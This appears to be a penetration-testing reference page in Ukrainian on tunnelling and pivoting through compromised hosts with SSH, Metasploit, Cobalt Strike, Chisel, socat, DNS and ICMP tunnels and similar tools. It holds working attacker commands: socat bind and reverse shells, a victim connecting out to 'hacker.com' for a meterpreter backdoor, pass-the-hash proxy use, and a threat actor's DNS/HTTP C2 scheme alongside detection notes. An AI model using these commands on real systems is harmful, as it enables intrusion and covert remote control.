# Тунелювання та перенаправлення портів

{{#include ../banners/hacktricks-training.md}}

## Порада щодо Nmap

> [!WARNING]
> Підтримка proxy у Nmap обмежена TCP-з'єднаннями та не впливає на сканування ping, портів або визначення ОС. Якщо scanner працює через SOCKS proxy, **вимкніть виявлення хостів** (`-Pn`) і використовуйте **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Фінальна команда використовує параметри `-u` і `-i` Evil-WinRM для ідентифікації облікового запису та WinRM-хоста; стандартний порт WinRM — 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH може перенаправляти X11-з'єднання, довільні TCP-порти та Unix-доменні сокети через свій зашифрований канал.<sup>[[6]](#references)</sup>

Графічне SSH-з'єднання (X)

`-Y` вмикає довірене перенаправлення X11, а `-C` запитує стиснення для перенаправлених даних.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Відкрийте новий порт на SSH Server --> Інший порт

Віддалене (`-R`) перенаправлення прослуховує SSH server і підключається до локальної сторони; явна адреса прив'язки визначає, які інтерфейси можуть отримати доступ до цього слухача.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Локальний порт --> Compromised host (SSH) --> Third_box:Port

Локальне перенаправлення (`-L`) прослуховує порт на клієнті та підключається до призначення з боку SSH-сервера.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Локальний порт --> Скомпрометований хост (SSH) --> Куди завгодно

Динамічне (`-D`) перенаправлення створює локальний прослуховувач SOCKS4/SOCKS5, з'єднання якого встановлюються з віддаленого боку.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Це корисно для отримання reverse shells із внутрішніх хостів через DMZ на ваш хост:

Параметр `GatewayPorts` на сервері визначає, чи може remote forward прив'язуватися за межами loopback; його значення за замовчуванням — `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Цей приклад із використанням root створює тунельні пристрої на обох хостах. Сервер має дозволяти tun forwarding, а вибраний обліковий запис повинен мати доступ до tun-пристрою; `PermitRootLogin yes` — один зі способів використовувати тут обліковий запис `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Увімкніть переспрямування на стороні сервера
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Встановіть новий маршрут на стороні клієнта
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 додав розширення strict-KEX для протидії атаці на цілісність раннього етапу транспорту Terrapin. За можливості оновіть обидва вузли та дотримуйтеся рекомендацій постачальника для старіших реалізацій, замість того щоб вважати, що forwarded channel захищений лише завдяки версії.<sup>[[8]](#references)</sup>

## SSHUTTLE

Ви можете **тунелювати** через **ssh** увесь **трафік** до **підмережі** через хост.\
Наприклад, перенаправити весь трафік, що надходить до 10.10.10.0/24

`sshuttle` забезпечує прозоре проксіювання через SSH і підтримує вибір підмереж та власну SSH-команду, як показано нижче.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Підключення за допомогою приватного ключа
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

`portfwd` у Metasploit підтримує локальне та віддалене перенаправлення, а його модуль SOCKS призначений для роботи з маршрутами сесій або `autoroute` і в цих прикладах за замовчуванням прослуховує порт 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Локальний порт --> Зламаний хост (активна сесія) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ще один спосіб:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Beacon у Cobalt Strike може ретранслювати з'єднання SOCKS4a/SOCKS5 через Beacon; `rportfwd` прив'язує порт на скомпрометованому хості, тоді як `rportfwd_local` ініціює з'єднання з ціллю з клієнта Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Відкрийте порт на Team Server на інтерфейсах, через які трафік має маршрутизуватися через Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> У цьому випадку **порт відкривається на хості Beacon**, а не на Team Server, і трафік надсилається на Team Server, а звідти — на вказаний host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Посібник із reverse-forwarding зазначає таку поведінку:<sup>[[14]](#references)</sup>

- Reverse port forward у Beacon призначений для **тунелювання трафіку до Team Server, а не для ретрансляції між окремими машинами**.
- Трафік **тунелюється в межах C2-трафіку Beacon**, включно з P2P-з'єднаннями.
- Високі порти зазвичай дають змогу уникнути обмежень привілейованих портів, але політика цільової ОС і наявні listeners усе одно застосовуються.

### rPort2Port local

> [!WARNING]
> У цьому випадку **порт відкривається на хості Beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (а не до Team Server), а звідти — на вказаний host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Проєкт надає такі endpoints вебтунелю, як `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` і `tunnel.php`; завантажте один із підтримуваних endpoints перед запуском локального proxy.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Ви можете завантажити його зі сторінки релізів [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel передає TCP/UDP-трафік через HTTP, використовуючи захищене SSH-з'єднання; використовуйте сумісні збірки клієнта/сервера та перевіряйте синтаксис команд вибраного релізу.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Перенаправлення портів
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Документація Ligolo-ng для швидкого старту описує TUN-інтерфейс на proxy, перевірку відбитка сертифіката для agent і налаштування маршрутів для тунельованої мережі.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Прив'язка агента та прослуховування

Ligolo-ng може додавати слухачі на agent, які перенаправляють трафік на адресу на стороні proxy, а його зарезервований діапазон `240.0.0.0/4` можна маршрутизувати для доступу до локальних сервісів agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Доступ до локальних портів агента
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot запускає reverse tunnel із жертви та відкриває SOCKS4 proxy на loopback-адресі атакувальника; його README також документує credentials для NTLM-proxy та hash options.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot через **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat поєднує такі типи адрес, як `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` і `PROXY`; наведені нижче приклади комбінують ці задокументовані кінцеві точки.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port через socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter через SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Ви можете пройти через **неавтентифікований проксі-сервер** за допомогою документованого типу адреси `PROXY` у socat, виконавши цей рядок замість останнього в консолі жертви.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL-тунель Socat

**/bin/sh console**

Створіть сертифікати з обох боків: клієнта та сервера
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Підключити локальний SSH-порт (22) до порту 443 хоста атакувальника
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink — це інструмент командного рядка PuTTY для підключення, з параметрами SSH forwarding, подібними до `ssh`.<sup>[[22]](#references)</sup>

Для SSH-порту використовуйте `-P` у верхньому регістрі. `-pw` збережено для сумісності, але цей параметр розкриває пароль у списку процесів; за можливості надавайте перевагу автентифікації за ключем або `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Оскільки цей binary виконуватиметься на жертві та є SSH-клієнтом, відкрийте SSH-сервіс і порт для reverse connection; нижче використовується `-R` для forwarding локально доступного порту на машину нападника.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Використовуйте контекст із дозволами, необхідними хосту, під час створення або зміни постійних правил `portproxy`. Microsoft документує наведені нижче форми `v4tov4` для додавання, перегляду та видалення.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

У вас має бути **доступ до системи через RDP**.\
Завантажте:

SocksOverRDP використовує Remote Desktop Dynamic Virtual Channels для передавання з'єднання SOCKS5 через наявний сеанс RDP; клієнтський plugin прослуховує `127.0.0.1:1080`, а серверний компонент працює на цілі RDP.<sup>[[25]](#references)</sup>

1. [Бінарні файли SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Цей tool використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service у Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
2. [Портативний бінарний файл Proxifier](https://www.proxifier.com/download/#win-tab)

На комп'ютері клієнта завантажте **`SocksOverRDP-Plugin.dll`** таким чином:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Тепер ми можемо **підключитися** до **victim** через **RDP** за допомогою **`mstsc.exe`**, і маємо отримати **prompt** із повідомленням, що **SocksOverRDP plugin** увімкнено, і він **прослуховуватиме** **127.0.0.1:1080**.

**Підключіться** через **RDP** і завантажте та виконайте на машині victim бінарний файл `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Тепер підтвердьте на своїй машині (атакувальника), що порт 1080 прослуховується:
```
netstat -antb | findstr 1080
```
Тепер ви можете використовувати [**Proxifier**](https://www.proxifier.com/), щоб проксувати трафік через цей порт.<sup>[[26]](#references)</sup>

## Проксіфікація Windows GUI Apps

Ви можете змусити Windows GUI Apps працювати через проксі за допомогою [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
У **Profile -> Proxy Servers** додайте IP-адресу та порт SOCKS-сервера.\
У **Profile -> Proxification Rules** додайте назву програми для проксіфікації та підключення до IP-адрес, які потрібно проксіфікувати; правила Proxifier можуть зіставляти програми, цільові хости та порти.<sup>[[27]](#references)</sup>

## Тунелювання через NTLM-проксі

Згаданий раніше інструмент, **Rpivot**, може ретранслювати трафік через проксі з NTLM-аутентифікацією. **OpenVPN** також може маршрутизувати трафік через такий проксі, якщо його налаштовано з auth-файлом і методом NTLMv2; це обходження проксі, а не обхід автентифікації проксі.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm автентифікується до upstream-проксі NTLM, відкриває локальні listeners і може зіставляти локальний tunnel port із destination service; після цього клієнти можуть використовувати цей локальний порт.<sup>[[29]](#references)</sup>\
Наприклад, перенаправити порт 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Тепер, якщо, наприклад, налаштувати на victim службу **SSH** для прослуховування порту 443, до неї можна підключитися через порт 2222 на attacker.<sup>[[29]](#references)</sup>\
Також можна використовувати **meterpreter**, який підключається до localhost:443, тоді як attacker прослуховує порт 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) — це набір інструментів Microsoft для reverse proxy на платформі .NET. Його можна знайти тут: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine створює тунель IPv4 через DNS-запити та використовує TUN-інтерфейси; задокументоване налаштування вимагає привілеїв, необхідних для створення цих інтерфейсів на обох кінцях.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Транспорт DNS має більші накладні витрати, ніж пряме TCP-з'єднання, і зазвичай є повільним; ви можете створити стиснене SSH-з'єднання через цей тунель за допомогою:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Завантажте його звідси**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 встановлює зашифрований канал command-and-control через DNS; наведені нижче команди сервера та клієнта відповідають задокументованому використанню.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **У PowerShell**

Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у PowerShell; у його README описано параметри `Start-Dnscat2`, наведені нижче.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding за допомогою dnscat**

Інтерактивна команда `listen` у Dnscat2 зіставляє локальний listener із віддаленим host і port.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Зміна DNS у proxychains

Proxychains-ng динамічно підключається до TCP-з'єднань і не може передавати UDP або ICMP; DNS-проксіювання налаштовується, тому перевіряйте встановлений `proxychains.conf` і helper для resolver замість припущення про фіксований публічний resolver. Legacy-скрипти `proxyresolv` надають `PROXY_DNS_SERVER` для вибору resolver; коли потрібні внутрішні імена, використовуйте resolver, доступний із pivot.<sup>[[34]](#references)[[35]](#references)</sup>

## Тунелі в Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Актор Storm-2603 створив **dual-channel C2 ("AK47C2")**, який зловживає *лише* вихідним трафіком **DNS** і **plain HTTP POST** — двома протоколами, які рідко блокуються в корпоративних мережах.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Генерує випадковий 5-символьний SessionID (наприклад, `H4T14`).
• Додає `1` для *task requests* або `2` для *results* і об'єднує різні поля (flags, SessionID, ім'я комп'ютера).
• Кожне поле **XOR-encrypted with the ASCII key `VHBD@H`**, кодується в hex і з'єднується крапками — зрештою додається домен, контрольований attacker:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Для записів **TXT** (і резервних записів **MG**) використовуються запити `DnsQuery()`.
• Коли відповідь перевищує 0xFF байт, backdoor **fragments** дані на частини по 63 байти та вставляє маркери:
`s<SessionID>t<TOTAL>p<POS>`, щоб C2 server міг упорядкувати їх.

2. **HTTP mode (AK47HTTP)**
• Створює JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Увесь blob XOR-`VHBD@H` → hex → надсилається як body у **`POST /`** із header `Content-Type: text/plain`.
• Відповідь використовує те саме кодування, а поле `cmd` виконується через `cmd.exe /c <command> 2>&1`.

Нотатки Blue Team
• Шукайте незвичайні **TXT queries**, перший label яких є довгим hex і які завжди закінчуються одним рідкісним доменом.
• Constant XOR key, за яким іде ASCII-hex, легко виявити за допомогою YARA: `6?56484244?484` (`VHBD@H` у hex).
• Для HTTP позначайте POST bodies із `text/plain`, які містять лише hex і мають кількість байтів, кратну двом.

{{#note}}
Канал зберігає кожен sub-domain label у межах ліміту DNS у 63 октети, але відповідність протоколу сама по собі не робить його stealthy; рідкісні домени, довгі hex labels і обсяг queries залишаються сигналами для виявлення.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans документує IPv4-over-ICMP tunnel із використанням TUN device та ICMP echo requests; для налаштування потрібні привілеї, достатні для створення interface.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Завантажте його звідси**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng передає TCP-з'єднання через ICMP і використовує наведені нижче параметри `-p`, `-l`, `-r` і `-R` для proxy, локального слухача, хоста призначення та порту призначення відповідно.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) — це агент для публікації локальних мережевих сервісів онлайн через захищений тунель; у документації CLI описано кінцеві точки HTTP, TCP і file URL, а ім’я хоста кінцевої точки, що виводиться, може відрізнятися залежно від кінцевої точки та облікового запису.<sup>[[39]](#references)</sup>

### Встановлення

- Створіть обліковий запис: https://ngrok.com/signup
- Завантаження клієнта:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Базове використання

**Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent також підтримує параметри автентифікації та TLS за потреби.<sup>[[39]](#references)</sup>_

#### Тунелювання TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Виставлення файлів через HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Перехоплення HTTP-запитів

_Корисно для XSS,SSRF,SSTI ..._\
Автономний agent за замовчуванням надає інтерфейс перегляду HTTP за адресою `http://127.0.0.1:4040`; інтерфейс призначений для HTTP-трафіку.<sup>[[40]](#references)</sup>

#### Тунелювання внутрішнього HTTP-сервісу

Опція `--host-header=rewrite` переписує upstream HTTP-заголовок `Host`, щоб він відповідав локальному сервісу.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Простий приклад конфігурації ngrok.yaml

У цьому прикладі використовується ngrok Agent Config v2; іменовані тунелі використовують `proto` та `addr` і запускаються за допомогою `ngrok start`.<sup>[[42]](#references)</sup> Він відкриває 3 тунелі:

- 2 TCP
- 1 HTTP зі статичними файлами з `/tmp/httpbin/`
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Конектор `cloudflared` для Cloudflare Tunnel встановлює вихідні з'єднання; опубліковані застосунки можуть маршрутизувати HTTP, HTTPS, TCP, SSH і RDP, тоді як quick tunnels призначені для розробки HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Однорядкова команда для quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Походження SOCKS5 (застарілий режим)

Застарілий прапорець `--socks5` повідомляє `cloudflared`, що локальний origin працює через SOCKS5; він не створює локальний SOCKS5 listener. Для керованого тунелю `originRequest.proxyType: socks` налаштовує обробку SOCKS5 origin.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Постійні тунелі з DNS

Конфігурація тунелю, яким керують локально, використовує ключі `tunnel`, `credentials-file` і `url` у нижньому регістрі, як показано нижче.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Запустіть connector:
```bash
cloudflared tunnel run mytunnel
```
Конектор встановлює вихідні з'єднання та за замовчуванням узгоджує QUIC із переходом на HTTP/2; не припускайте, що кожне розгортання використовує TCP/443. Запускайте його лише з привілеями, необхідними для вашого розгортання.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) — це reverse proxy на Go із підтримкою **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX і XTCP**. XTCP використовує P2P hole punching, успішність якого залежить від NAT. Починаючи з **v0.53.0**, він може працювати як **SSH Tunnel Gateway**, тому цільовий хост може використовувати стандартний клієнт OpenSSH без бінарного файлу `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Класичний reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
